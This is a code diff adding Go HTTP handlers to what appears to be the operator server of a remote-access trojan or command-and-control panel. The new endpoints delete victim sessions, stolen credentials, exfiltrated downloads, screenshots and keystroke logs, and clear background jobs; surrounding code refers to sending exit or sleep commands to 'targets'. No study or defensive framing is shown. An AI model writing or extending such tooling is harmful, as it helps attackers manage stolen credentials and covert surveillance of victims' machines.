@@ -189,6 +189,129 @@ func handleScreenshotFile(w http.ResponseWriter, r *http.Request) {
 	http.NotFound(w, r)
 }
 
+// ---------------------------------------------------------------- 删除/清空
+
+// handleSessionRemove POST /api/session/remove {"sid":"B001"} -- 从列表删除会话记录
+// (仅清理服务端状态, 不向目标下发 exit; 要下线请用 /api/session/exit 或 kill)。
+func handleSessionRemove(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		SID string `json:"sid"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
+		return
+	}
+	if req.SID == "" {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "缺少 sid"})
+		return
+	}
+
+	if v2st.remove(req.SID) {
+		eventLog("operator", req.SID, "删除会话", "")
+		writeJSON(w, map[string]interface{}{"ok": true})
+		return
+	}
+
+	st.mu.Lock()
+	_, ok := st.byID[req.SID]
+	if ok {
+		delete(st.byID, req.SID)
+		for ident, sid := range st.byIdent {
+			if sid == req.SID {
+				delete(st.byIdent, ident)
+			}
+		}
+	}
+	st.mu.Unlock()
+	if ok {
+		eventLog("operator", req.SID, "删除会话", "")
+		writeJSON(w, map[string]interface{}{"ok": true})
+		return
+	}
+	writeJSON(w, map[string]interface{}{"ok": false, "error": "会话不存在"})
+}
+
+// handleCredentialsDelete POST /api/credentials/delete {"id":123}
+func handleCredentialsDelete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ID uint64 `json:"id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
+		return
+	}
+	if !storeDeleteRecord(KindCredential, req.ID) {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "凭据不存在"})
+		return
+	}
+	eventLog("operator", "", "删除凭据", fmt.Sprintf("#%d", req.ID))
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
+// handleDownloadsDelete POST /api/downloads/delete {"id":123} -- 同时删除落盘文件
+func handleDownloadsDelete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ID uint64 `json:"id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
+		return
+	}
+	p := storeFindPath(KindDownload, req.ID)
+	if !storeDeleteRecord(KindDownload, req.ID) {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "下载记录不存在"})
+		return
+	}
+	if p != "" {
+		os.Remove(p)
+	}
+	eventLog("operator", "", "删除下载", fmt.Sprintf("#%d", req.ID))
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
+// handleScreenshotsDelete POST /api/screenshots/delete {"id":123} -- 同时删除落盘文件
+func handleScreenshotsDelete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ID uint64 `json:"id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
+		return
+	}
+	p := storeFindPath(KindScreenshot, req.ID)
+	if !storeDeleteRecord(KindScreenshot, req.ID) {
+		writeJSON(w, map[string]interface{}{"ok": false, "error": "截屏记录不存在"})
+		return
+	}
+	if p != "" {
+		os.Remove(p)
+	}
+	eventLog("operator", "", "删除截屏", fmt.Sprintf("#%d", req.ID))
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
+// handleKeylogsClear POST /api/keylogs/clear {} -- 清空全部键盘记录
+func handleKeylogsClear(w http.ResponseWriter, r *http.Request) {
+	storeClear(KindKeystroke)
+	eventLog("operator", "", "清空键盘记录", "")
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
+// handleJobsClear POST /api/jobs/clear {} -- 清空已结束的作业 (保留 running)
+func handleJobsClear(w http.ResponseWriter, r *http.Request) {
+	bgJobStore.mu.Lock()
+	kept := bgJobStore.jobs[:0]
+	for _, j := range bgJobStore.jobs {
+		if j.Status == "running" {
+			kept = append(kept, j)
+		}
+	}
+	bgJobStore.jobs = kept
+	bgJobStore.mu.Unlock()
+	eventLog("operator", "", "清空作业", "")
+	writeJSON(w, map[string]interface{}{"ok": true})
+}
+
 // ---------------------------------------------------------------- 会话控制
 
 func handleSessionSleep(w http.ResponseWriter, r *http.Request) {
